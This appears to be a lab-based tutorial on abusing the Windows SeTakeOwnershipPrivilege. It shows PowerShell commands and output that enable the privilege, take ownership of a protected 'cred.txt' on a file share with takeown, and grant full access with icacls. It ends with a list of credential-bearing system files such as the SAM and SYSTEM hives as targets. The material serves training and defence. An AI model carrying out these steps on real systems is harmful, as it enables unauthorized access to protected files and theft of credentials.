# SeTakeOwnershipPrivilege

## SeTakeOwnershipPrivilege

**SeTakeOwnershipPrivilege:** grants a user the ability to take ownership of any "securable object," meaning Active Directory objects, NTFS files/folders, printers, registry keys, services, and processes.

> **This privilege assigns WRITE\_OWNER rights over an object, that’s meaning user can change owner in Security Descriptor for this object**

#### Who can take it ?

* Admins take it by default
* for Service Account has privilege to take **`VSS snapshots`** or **`Backup Jobs`**
* with another privilege like  `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege`

#### Severity

* access to sensitive data
* Remote Code Execution (RCE)
*   Denial-of-Service (DOS)

    > we can use it to exploit shared folder or sensitive files

***

## Exploit - **Leveraging the Privilege**

#### **Reviewing Current User Privileges**

```powershell
PS C:\irix> **whoami /priv**

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                              State
============================= ======================================================= ========
**SeTakeOwnershipPrivilege**      Take ownership of files or other objects                **Disabled**
SeChangeNotifyPrivilege       Bypass traverse checking                                Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

#### **Enabling SeTakeOwnershipPrivilege**

to use this privilege we must enable it

```powershell
 PS C:\irix> Import-Module .\Enable-Privilege.ps1
PS C:\irix> .\EnableAllTokenPrivs.ps1
PS C:\irix> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

#### **Choosing a Target File**

we'll target an interesting file found on a file share. search in public and private folder in sections like (IT, HR, Sales)

we find that all Domain Users can list the contents of certain subdirectories but get an `Access denied` message when trying to read the contents of most files. We find a file named `cred.txt` under the `IT` subdirectory of the `Private` share folder during our enumeration.

we will use `SeTakeOwnershipPrivilege`&#x20;

#### **Checking files Ownership**

we can’t to see the owner of this file

```powershell
PS C:\irix> **Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}**
 
FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

#### **Checking folder Ownership**

we will back step to check the ownership of folder

```powershell
PS C:\irix> **cmd /c dir /q 'C:\Department Shares\Private\IT'**

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B
 
 Directory of C:\Department Shares\Private\IT
 
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\**sccm_svc**  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
               1 File(s)             36 bytes
               2 Dir(s)  17,079,754,752 bytes free
```

#### **Taking Ownership of the File**

Now we can use the **`takeown`** Windows binary to change ownership of the file.

```powershell
PS C:\irix> takeown /f 'C:\Department Shares\Private\IT\cred.txt'
 
SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

#### **Confirming Ownership Changed**

```powershell
PS C:\irix> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
 
Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

#### **Modifying the File ACL**

We may still not be able to read the file and need to modify the file ACL using `icacls` to be able to read it.

```powershell
PS C:\irix> cat 'C:\Department Shares\Private\IT\cred.txt'

*cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.*
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Let's grant our user full privileges over the target file.

```powershell
PS C:\irix> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

***

#### **Files of Interest**

Some local files of interest may include:

```
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```
